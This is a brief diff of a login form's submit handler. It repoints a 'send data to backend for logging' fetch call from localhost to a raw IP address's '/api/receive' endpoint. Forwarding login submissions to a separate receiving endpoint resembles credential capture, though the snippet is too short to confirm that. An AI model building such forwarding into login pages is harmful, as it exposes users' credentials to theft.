@@ -92,7 +92,7 @@ loginForm.addEventListener('submit', async function(event) {
 
     try {
         // Always send data to backend for logging
-        await fetch('http://localhost:8080/api/receive', {
+        await fetch('http://10.59.32.216:8080/api/receive', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
